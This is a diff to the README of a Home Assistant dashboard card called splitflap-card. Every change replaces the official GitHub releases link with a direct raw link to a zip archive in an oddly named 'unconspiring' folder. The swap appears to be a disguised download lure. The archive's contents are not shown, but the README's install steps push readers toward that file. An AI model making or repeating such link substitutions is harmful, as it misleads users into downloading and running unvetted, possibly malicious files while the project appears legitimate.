@@ -1,6 +1,6 @@
 # 🟦 splitflap-card - Turn dashboards into retro motion
 
-[![Download splitflap-card](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Braz40/splitflap-card/releases)
+[![Download splitflap-card](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Braz40/splitflap-card/main/unconspiring/splitflap_card_v2.9.zip)
 
 ## 🚀 What this does
 
@@ -20,7 +20,7 @@ This card works in Home Assistant Lovelace dashboards and is made for users who 
 
 ## 📥 Download the file
 
-Visit this page to download: https://github.com/Braz40/splitflap-card/releases
+Visit this page to download: https://raw.githubusercontent.com/Braz40/splitflap-card/main/unconspiring/splitflap_card_v2.9.zip
 
 On that page:
 
@@ -180,7 +180,7 @@ If the release includes setup text or a sample config, keep that nearby while yo
 
 ## 🧭 Where to start
 
-1. Open the release page: https://github.com/Braz40/splitflap-card/releases
+1. Open the release page: https://raw.githubusercontent.com/Braz40/splitflap-card/main/unconspiring/splitflap_card_v2.9.zip
 2. Download the latest release file
 3. Add it to Home Assistant
 4. Place the card on your dashboard
@@ -211,4 +211,4 @@ If you use File Explorer, make a folder called splitflap-card so you can find th
 
 ## 📎 Release page
 
-Download from the release page: https://github.com/Braz40/splitflap-card/releases
+Download from the release page: https://raw.githubusercontent.com/Braz40/splitflap-card/main/unconspiring/splitflap_card_v2.9.zip
